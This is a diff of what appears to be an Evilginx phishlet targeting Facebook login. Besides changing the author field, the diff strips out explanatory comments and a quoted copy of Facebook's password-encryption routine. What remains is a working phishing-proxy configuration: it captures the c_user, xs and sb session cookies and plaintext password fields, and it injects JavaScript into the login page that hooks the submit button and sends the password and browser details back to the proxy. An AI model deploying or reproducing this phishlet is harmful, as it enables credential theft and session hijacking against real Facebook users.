@@ -1,4 +1,4 @@
-author: '@An0nud4y'
+author: '@charlesbel'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
@@ -14,8 +14,6 @@ sub_filters:
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
 
-
-
 auth_tokens:
   - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
@@ -28,9 +26,6 @@ credentials:
     key: 'unenc_password'
     search: '(.*)'
     type: 'post'
-#Custom parameters are added in order to grab the requests made by javascripts injected in order to get device user-agent and other details.
-# key: 'pass'  is added in order to increase the chances of grabbing the pass field if in case failed from above.
-
   custom: 
     - key: 'pass'
       search: '(.*)'
@@ -51,36 +46,31 @@ credentials:
       search: '(.*)'
       type: 'post'
 
+   
 login:
   domain: 'www.facebook.com'
   path: '/login.php'
 
-#Below Javascript function will do two things (1) on page load it will make 4 request back to server to let us capture the important data. (2) Will add a function to login button to leak the value of password field.
-
 js_inject:
   - trigger_domains: ["www.facebook.com"]
-    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"] #The target path is important as the javascript will be injected in all address pages started with /login 
+    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
     trigger_params: []
     script: |  
       function onclickListener(){
         var submit = document.querySelectorAll('button[type=submit]')[0];
         submit.setAttribute("onclick", "sendPass()");
-        
         var useragent = navigator.userAgent;
         xhr.open("POST", '/', true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("UserAgent="+encodeURIComponent(useragent));
-        
         var browser = navigator.appName;
         xhr.open("POST", '/', true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("Browser="+encodeURIComponent(browser));
-        
         var engine = navigator.product;
         xhr.open("POST", '/', true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("Engine="+encodeURIComponent(engine));
-        
         var platform = navigator.platform;
         var xhr = new XMLHttpRequest();
         xhr.open("POST", '/', true);
@@ -97,36 +87,3 @@ js_inject:
         return;
       }
       setTimeout(function(){ onclickListener(); }, 1000);
-      
-
-# UPDATE : LOOKS LIKE FACEBOOK HAS CHANGED THE JAVASCRIPT FUNCTION, STILL THE FILTERS WORKS SOMETIME , SO I LEFT THEM AS THEY WERE IN PREVIOUS PHISHLET I MADE.
-      
-# The js Function Responsible For Password Encryption is Present in this js file Located At : https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/yEB-M5_vVi6.js?_nc_x=Ij3Wp8lg5Kz
-#
-# _encryptBeforeSending: function (a) {
-#      var c = this;
-#      a = a.bind(this);
-#      var d = this.loginFormParams && this.loginFormParams.pubKey;
-#      if ((window.crypto || window.msCrypto) && d) {
-#        var e = b('DOM').scry(this.loginForm, 'input[id="pass"]') [0],
-#        f = b('FBBrowserPasswordEncryption'),
-#        g = Math.floor(Date.now() / 1000).toString();
-#        b('promiseDone') (f.encryptPassword(d.keyId, d.publicKey, e.value, g), function (d) {
-#          d = b('DOM').create('input', {
-#            type: 'hidden',
-#            name: 'ep',
-#            value: d
-#          });
-#          c.loginForm.appendChild(d);
-#          e.disabled = !0;
-#          a()
-#        }, function (c) {
-#          var d = '#PWD_BROWSER',
-#          e = 5,
-#          f = b('LoginServicePasswordEncryptDecryptEventTypedLogger');
-#          new f().setError('BrowserEncryptionFailureInLoginFormControllerWWW').setGrowthFlow('Bluebar/main login WWW').setErrorMessage(c.message).setPasswordTag(d).setPasswordEncryptionVersion(e).setPasswordTimestamp(g).logVital();
-#          a()
-#        })
-#      } else a()
-#    },
-
